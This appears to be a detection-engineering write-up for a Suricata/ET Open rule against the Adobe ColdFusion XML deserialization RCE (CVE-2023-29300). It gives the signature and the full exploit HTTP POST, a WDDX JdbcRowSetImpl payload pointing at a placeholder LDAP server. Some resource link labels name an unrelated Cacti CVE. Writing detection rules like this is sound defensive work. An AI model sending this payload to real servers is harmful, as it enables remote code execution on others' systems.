# ET Open Submission (Return from PCRE grave)
### May 1st, 2024
### Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)


![8olo1g](https://github.com/eatinsundip/Suricata/assets/43767555/aadafd56-30f9-4747-bb3e-2d78dcfa22f4)


## Resources

1. [https://github.com/taythebot/CVE-2022-46169](https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2023-29300)
2. [https://github.com/lal0ne/vulnerability/tree/main/Cacti/CVE-2022-46169](https://blog.projectdiscovery.io/adobe-coldfusion-rce/)


## Signature

```alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)"; flow:to_server,established; http.method; content:"POST"; http.uri; content:"/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true"; http.request_body; content:"argumentCollection|3d 3c|wddxPacket|20|version|3d 27|1|2e|0|27 3e 3c|header|2f 3e 3c|data|3e 3c|struct|20|type|3d 27|xcom|2e|sun|2e|rowset|2e|JdbcRowSetImplx|27 3e 3c|var|20|name|3d 27|dataSourceName|27 3e 3c|string|3e|ldap|3a 2f 2f|"; pcre:"/^.{3,100}/"; content:"|3c 2f|string|3e 3c 2f|var|3e 3c|var|20|name|3d 27|autoCommit|27 3e 3c|boolean|20|value|3d 27|true|27 2f 3e 3c 2f|var|3e 3c 2f|struct|3e 3c 2f|data|3e 3c 2f|wddxPacket|3e|"; sid:1; rev:1; metadata:attack_target Server, created_at 2022_01_04, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2023_01_04;)```

^^ Still needs editing and a fast_pattern

[Job-CVE-2023-29300.zip](https://github.com/eatinsundip/Suricata/files/15173814/flowsynth-CVE-2023-29300.zip)

[https://dalton.securitymidwest.net/dalton/job/3cbf2c602f167d02](https://dalton.securitymidwest.net/dalton/job/3cbf2c602f167d02)


The exploit itself:


POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 333


argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://your.ldap.server/example</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>


Breaking down this post request
	• Http.method
		○ POST
	• I plan to test headers manually with the exploit to see if they are required or not. I doubt they are so they are not added right now.
	• Http.uri
		○ /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true
	• Http.request_body
		○ argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://
		○ PCRE for any ldap server name or possible IP. I chose I very broad pcre for this.
		○ </string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>

CURRENT ALERT:

alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)"; flow:to_server,established; http.method; content:"POST"; http.uri; content:"/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true"; http.request_body; content:"argumentCollection|3d 3c|wddxPacket|20|version|3d 27|1|2e|0|27 3e 3c|header|2f 3e 3c|data|3e 3c|struct|20|type|3d 27|xcom|2e|sun|2e|rowset|2e|JdbcRowSetImplx|27 3e 3c|var|20|name|3d 27|dataSourceName|27 3e 3c|string|3e|ldap|3a 2f 2f|"; pcre:"/^.{3,100}/"; content:"|3c 2f|string|3e 3c 2f|var|3e 3c|var|20|name|3d 27|autoCommit|27 3e 3c|boolean|20|value|3d 27|true|27 2f 3e 3c 2f|var|3e 3c 2f|struct|3e 3c 2f|data|3e 3c 2f|wddxPacket|3e|"; sid:1; rev:1; metadata:attack_target Server, created_at 2022_01_04, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at 2023_01_04;)


## NOTES
Need to test what headers are even necessary in the actual exploit.
